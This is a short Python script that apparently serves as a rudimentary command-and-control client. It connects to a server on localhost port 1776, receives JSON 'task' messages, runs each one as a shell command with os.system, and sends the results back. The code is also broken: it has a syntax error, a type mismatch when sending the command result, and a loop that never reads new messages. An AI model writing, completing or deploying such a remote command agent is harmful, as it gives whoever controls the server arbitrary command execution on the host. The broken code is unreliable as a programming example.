import socket
import sys
import json
import time
import uuid
import os

time.sleep(0)
uuid = uuid.uuid4()
MsgNum = 0


def GenMsg(x):
    if (x == 0):
        NewMsgJ = '{"id": 0, "name": "test", "Type": "init"}'
        NewMsg = str.encode(NewMsgJ)
    else:
        cmd_to_run = x
        cmd_results = os.system(cmd_to_run)
        NewMsg = cmd_results
    return NewMsg


Msg = GenMsg(MsgNum)

HOST, PORT = "localhost", 1776
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    # Connect to server and send data
    sock.connect((HOST, PORT))
    sock.sendall(Msg)

    # Receive data from the server and shut down
    received = sock.recv(1024)
    
    while (received != "quit"):
        raw_receive = received.decode()
        receive = json.loads(raw_receive)
        Msg2 = GenMsg(receive["task"]
        sock.sendall(Msg2)
        continue

finally:
    sock.close()

print("Sent:     {}".format(Msg))
print("Received: {}".format(received))
